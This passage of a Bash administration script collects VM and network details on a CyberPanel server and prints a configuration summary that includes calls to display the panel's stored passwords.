	_vmCPU=$(get_cpu_info)
	_vmMemory=$(get_memory_info)
	_vmSSHPort=$(get_ssh_port)

	if command -v hostname > /dev/null 2>&1; then
		_vmHostname=$(hostname)
	fi

	if command -v lscpu > /dev/null 2>&1; then
		_vmHypervisor=$(lscpu|grep -iE 'hypervisor vendor'|head -n 1|cut -d: -f2|tr -d '[:space:]')
	fi

	if command -v hostnamectl > /dev/null 2>&1; then
		_tmpVmHypervisor=$(hostnamectl 2>/dev/null|grep -iE 'virtualization:'|head -n 1|cut -d: -f2|tr -d '[:space:]')
		if [ -n "$_tmpVmHypervisor" ];then
			_vmHypervisor="$_tmpVmHypervisor"
		fi

		# _tmpVmHostname=$(hostnamectl 2>/dev/null|grep -iE 'hostname:'|head -n 1|cut -d: -f2|tr -d '[:space:]')
		# if [ -n "$_tmpVmHostname" ];then
		# 	_vmHostname="$_tmpVmHostname"
		# fi

		_getVmHostname=0
		_tmpVmHostname=""
		_transientHostname=$(hostnamectl 2>/dev/null|grep -iE 'Transient hostname:'|cut -d: -f2|tr -d '[:space:]')
		if [ -n "$_transientHostname" ];then
			_tmpVmHostname="$_transientHostname"
		fi

		if [ -z "$_tmpVmHostname" ];then
			_prettyHostname=$(hostnamectl 2>/dev/null|grep -iE 'pretty hostname:'|cut -d: -f2|tr -d '[:space:]')
			if [ -n "$_prettyHostname" ];then
				_tmpVmHostname="$_prettyHostname"
			fi
		fi

		if [ -z "$_tmpVmHostname" ];then
			_staticHostname=$(hostnamectl 2>/dev/null|grep -iE 'static hostname:'|cut -d: -f2|tr -d '[:space:]')
			if [ -n "$_staticHostname" ] && [ "$_staticHostname" != "n/a" ];then
				_tmpVmHostname="$_staticHostname"
			fi
		fi

		if [ -n "$_tmpVmHostname" ];then
			_vmHostname="$_tmpVmHostname"
		fi
	fi

	if [ -z "$_vmSSHPort" ];then
		check_ports
	fi

	PANEL_PORT=$(cat /usr/local/lscp/conf/bind.conf)
	if [ -z "$PANEL_PORT" ] ; then
		PANEL_PORT="8090"
	fi

	get_info_ip

	echo "=================================================="
	echo "              Configuration Details               "
	echo "--------------------------------------------------"
	echo "[*] Incoming IP "
	echo "[*] CyberPanel https://${PUBLIC_IP}:${PANEL_PORT}"
	echo "[*] IP Address  : $PUBLIC_IP"
	echo "[*] Country     : $COUNTRY_IP"
	echo "[*] State       : $STATE_IP"
	echo "[*] City        : $CITY_IP"
	echo "[*] ISP         : $ISP_IP"
	echo
	echo "[*] Virtualization $_vmHypervisor"
	echo "[*] VM NAME     : "
	_lineIP=0
	if [ -n "$_vmIPaddr" ];then
		for _ip in $_vmIPaddr
		do
			_lineIP=$(( _lineIP + 1 ))
			if [ "$_lineIP" -eq 1 ];then
				echo "[*] VM IP       : $_ip"
			else
				echo "                  $_ip"
			fi
		done
	else
		echo "[*] VM IP       : $_vmIPaddr"
	fi

	# echo "[*] VM GATEWAY  : $_vmGateway"
	_lineGateway=0
	if [ -n "$_vmGateway" ];then
		for _gateway in $_vmGateway
		do
			_lineGateway=$(( _lineGateway + 1 ))
			if [ "$_lineGateway" -eq 1 ];then
				echo "[*] VM GATEWAY  : $_gateway"
			else
				echo "                  $_gateway"
			fi
		done
	else
		echo "[*] VM GATEWAY  : $_vmGateway"
	fi

	if [ -n "$_vmDns" ];then
		_lineDNS=0
		for _dns in $_vmDns
		do
			_lineDNS=$(( _lineDNS + 1 ))
			if [ "$_lineDNS" -eq 1 ];then
				echo "[*] VM DNS      : $_dns"
			else
				echo "                  $_dns"
			fi
		done
	else
		echo "[*] VM DNS      : $_vmDns"
	fi

	echo "[*] VM HOST     : "
	echo "[*] VM VLAN     : "
	echo "[*] VM HOSTNAME : $_vmHostname"
	echo "[*] VM OS       : $_vmOS"
	echo "[*] VM KERNEL   : $_vmKernel"
	echo "[*] VM CPU      : $_vmCPU"
	echo "[*] VM MEMORY   : $_vmMemory"
	echo "[*] TUNNEL NAME : "
	echo "[*] DOMAIN NAME : "
	echo "[*] SUBDOMAIN   : "
	echo "[*] SSH PORT    : $_vmSSHPort"
	echo
	cyberpanel_current_version
	cyberpanel_admin_password
	litespeed_admin_password
	cyberpanel_cloudflare
	cyberpanel_mysql_root_password
	cyberpanel_print_active_domain
	echo "--------------------------------------------------"
}

set_default_path
check_proccess
check_firewall
check_user_ssh_dir
get_detail

clean
